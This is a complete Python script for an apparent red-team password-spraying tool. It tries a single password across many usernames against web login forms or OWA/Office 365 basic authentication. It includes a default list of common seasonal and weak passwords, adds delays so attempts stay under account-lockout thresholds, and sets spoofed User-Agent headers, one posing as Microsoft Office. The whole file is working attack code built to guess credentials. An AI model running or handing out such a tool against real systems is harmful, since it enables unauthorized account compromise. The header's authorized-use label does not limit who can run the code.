#!/usr/bin/env python3
"""
Pass Spray — Password Spraying Tool for Active Directory / Web Applications
Performs low-and-slow password spraying to avoid lockouts.
Author: Omar Khalid (amooryx) | github.com/amooryx/pass-spray
AUTHORIZED USE ONLY — for authorized red team engagements and penetration tests.
"""

import argparse
import json
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

COMMON_PASSWORDS = [
    "Password1!", "Welcome1!", "Company2024!", "Season2024!",
    "Summer2024!", "Winter2024!", "Spring2024!", "Fall2024!",
    "P@ssw0rd", "Admin123!", "Passw0rd!", "P@ss1234",
]

# ─── Web form spraying ─────────────────────────────────────────────────────────
def spray_web(url: str, user_field: str, pass_field: str,
              users: list[str], password: str,
              success_indicator: str, fail_indicator: str,
              headers: dict, delay: float, timeout: float) -> list[dict]:
    hits = []
    for user in users:
        data = urllib.parse.urlencode({user_field: user, pass_field: password}).encode()
        req  = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent",   "Mozilla/5.0")
        for k, v in headers.items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(8192).decode(errors="ignore")
                if success_indicator and success_indicator.lower() in body.lower():
                    print(f"  [!!!] SUCCESS: {user}:{password}")
                    hits.append({"user": user, "password": password, "status": "success"})
                elif fail_indicator and fail_indicator.lower() not in body.lower():
                    print(f"  [?]   Possible: {user}:{password} (status={resp.status})")
                    hits.append({"user": user, "password": password, "status": "possible"})
        except urllib.error.HTTPError as e:
            if e.code not in (401, 403):
                print(f"  [?]   HTTP {e.code} for {user}")
        except Exception as ex:
            print(f"  [!]   Error for {user}: {ex}")
        time.sleep(delay)
    return hits

# ─── OWA / O365 spraying (basic auth check) ───────────────────────────────────
def spray_owa(owa_url: str, users: list[str], password: str,
              delay: float, timeout: float) -> list[dict]:
    import base64
    hits = []
    for user in users:
        creds = base64.b64encode(f"{user}:{password}".encode()).decode()
        req   = urllib.request.Request(owa_url)
        req.add_header("Authorization", f"Basic {creds}")
        req.add_header("User-Agent",    "Microsoft Office/16.0 (Windows NT 10.0)")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status in (200, 302):
                    print(f"  [!!!] SUCCESS: {user}:{password} (OWA)")
                    hits.append({"user": user, "password": password, "method": "OWA"})
        except urllib.error.HTTPError as e:
            if e.code not in (401, 403):
                print(f"  [?]   HTTP {e.code} for {user}")
        except Exception:
            pass
        time.sleep(delay)
    return hits

def main():
    parser = argparse.ArgumentParser(
        description="Pass Spray — Password Spraying (Authorized use only)",
    )
    subparsers = parser.add_subparsers(dest="mode")

    web_p = subparsers.add_parser("web", help="Spray a web login form")
    web_p.add_argument("url",              help="Login form URL")
    web_p.add_argument("--users",          required=True, help="Users file (one per line)")
    web_p.add_argument("--password",       required=True, help="Password to spray")
    web_p.add_argument("--user-field",     default="username")
    web_p.add_argument("--pass-field",     default="password")
    web_p.add_argument("--success",        default="",     help="Indicator in successful response body")
    web_p.add_argument("--fail",           default="",     help="Indicator in failed response body")
    web_p.add_argument("--delay",          type=float, default=1.0, help="Delay between attempts (seconds)")
    web_p.add_argument("--timeout",        type=float, default=10)
    web_p.add_argument("--header",         nargs="*")
    web_p.add_argument("--out",            help="Output JSON file")

    owa_p = subparsers.add_parser("owa", help="Spray OWA / Exchange / O365 basic auth")
    owa_p.add_argument("url")
    owa_p.add_argument("--users",          required=True)
    owa_p.add_argument("--password",       required=True)
    owa_p.add_argument("--delay",          type=float, default=2.0)
    owa_p.add_argument("--timeout",        type=float, default=10)
    owa_p.add_argument("--out",            help="Output JSON file")

    wordlist_p = subparsers.add_parser("wordlist", help="Print default password wordlist")

    args = parser.parse_args()
    if not args.mode:
        parser.print_help()
        sys.exit(1)

    if args.mode == "wordlist":
        for p in COMMON_PASSWORDS:
            print(p)
        return

    with open(args.users) as f:
        users = [l.strip() for l in f if l.strip()]
    print(f"[*] Spraying {len(users)} users with password: {args.password}")
    print(f"[!] AUTHORIZED USE ONLY")

    if args.mode == "web":
        headers = {}
        if args.header:
            for h in args.header:
                if ": " in h:
                    k, v = h.split(": ", 1)
                    headers[k] = v
        hits = spray_web(args.url, args.user_field, args.pass_field,
                         users, args.password,
                         args.success, args.fail, headers, args.delay, args.timeout)
    else:
        hits = spray_owa(args.url, users, args.password, args.delay, args.timeout)

    print(f"\n[*] {len(hits)} successful/possible logins")
    if args.out:
        with open(args.out, "w") as f:
            json.dump(hits, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
